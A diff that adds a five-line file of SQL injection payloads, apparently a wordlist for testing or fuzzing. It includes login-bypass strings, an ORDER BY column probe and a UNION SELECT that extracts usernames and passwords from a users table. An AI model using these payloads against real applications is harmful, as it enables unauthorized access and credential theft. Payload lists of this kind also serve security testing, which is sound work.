@@ -1,0 +1,5 @@
+' OR '1'='1
+' OR '1'='1' -- -
+1' ORDER BY 1-- -
+1' UNION SELECT user,password FROM users-- -
+admin'-- -
